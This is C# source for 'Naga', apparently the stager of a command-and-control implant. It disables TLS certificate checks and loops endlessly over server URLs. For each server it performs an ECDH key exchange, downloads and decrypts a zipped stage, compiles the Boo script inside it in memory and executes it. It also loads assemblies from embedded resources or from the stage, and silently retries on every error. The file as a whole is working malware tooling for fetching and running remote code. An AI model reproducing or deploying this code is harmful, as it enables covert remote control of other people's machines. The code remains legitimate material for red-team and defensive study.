using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using Boo.Lang.Compiler;
using Boo.Lang.Compiler.IO;
using Boo.Lang.Compiler.Pipelines;

namespace Naga
{
    public class ST
    {
        private static Guid GUID;
        private static string[] URLS;
        private static string HEXPSK;
        private static byte[] PSK;
        private static ZipStorer _stage;

        static ST()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072;
            ServicePointManager.Expect100Continue = false;
            AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
        }

        private static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
        {
            var dllName = Utils.GetDllName(args.Name);
#if DEBUG
            Console.WriteLine("\t[-] '{0}' was required...", dllName);
#endif
            byte[] bytes;
            try
            {
                bytes = Utils.GetResourceByName(dllName);
            }
            catch
            {
                bytes = Utils.GetResourceFromZip(_stage, dllName) ??
                        File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() +
                                          dllName);
            }
#if DEBUG
            Console.WriteLine("\t[+] '{0}' loaded...", dllName);
#endif
            return Assembly.Load(bytes);
        }

        public static void Start(string _guid, string _psk, string[] _urls)
        {
            //AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(ResolveEventHandler);

            GUID = Guid.Parse(_guid);
            HEXPSK = _psk;
            PSK = Utils.Hex2Binary(_psk);
            URLS = _urls;

#if DEBUG
            Console.WriteLine("[+] URLS: {0}", String.Join(",", URLS));
#endif
            while (true)
            {
                foreach (var url in URLS)
                {
                    Uri URL;
                    URL = new Uri(new Uri(url), GUID.ToString());
                    try
                    {
                        byte[] key = Crypto.ECDHKeyExchange(URL, PSK);
                        byte[] encrypted_zip = Comms.HttpGet(URL);
                        _stage = ZipStorer.Open(new MemoryStream(Crypto.Decrypt(key, encrypted_zip)), FileAccess.ReadWrite, true);

                        byte[] resource = Utils.GetResourceFromZip(_stage, "Main.boo");
                        string source = Encoding.UTF8.GetString(resource, 0, resource.Length);

                        RunBooEngine(source);
                    }
                    catch { }
                }
            }
        }

        public static void RunBooEngine(string source)
        {
            Console.WriteLine("\n[*] Compiling Stage Code");

            CompilerParameters parameters = new CompilerParameters(false);
            parameters.Input.Add(new StringInput("Stage.boo", source));
            parameters.Pipeline = new CompileToMemory();
            parameters.Ducky = true;

            parameters.AddAssembly(Assembly.LoadWithPartialName("Boo.Lang"));
            parameters.AddAssembly(Assembly.LoadWithPartialName("Boo.Lang.Extensions"));
            parameters.AddAssembly(Assembly.LoadWithPartialName("Boo.Lang.Parser"));
            parameters.AddAssembly(Assembly.LoadWithPartialName("Boo.Lang.Compiler"));
            parameters.AddAssembly(Assembly.LoadWithPartialName("mscorlib"));
            parameters.AddAssembly(Assembly.LoadWithPartialName("System"));
            parameters.AddAssembly(Assembly.LoadWithPartialName("System.Core"));
            parameters.AddAssembly(Assembly.LoadWithPartialName("System.Web.Extensions"));
            //Console.WriteLine(compiler.Parameters.LibPaths);
            //compiler.Parameters.LoadAssembly("System");

            BooCompiler compiler = new BooCompiler(parameters);
            CompilerContext context = compiler.Run();

            //Note that the following code might throw an error if the Boo script had bugs.
            //Poke context.Errors to make sure.
            if (context.GeneratedAssembly != null)
            {
                Console.WriteLine("[+] Compilation Successful!");
                Console.WriteLine("[*] Executing");

                //AppDomain.CurrentDomain.AssemblyResolve -= ResolveEventHandler;
                context.GeneratedAssembly.EntryPoint.Invoke(null, new object[] { new string[] { GUID.ToString(), HEXPSK, string.Join(",", URLS) } });
            }
            else
            {
                Console.WriteLine("[-] Error(s) compiling script, this probably means your Boo script has bugs\n");
                foreach (CompilerError error in context.Errors)
                    Console.WriteLine(error);
            }
        }
    }
}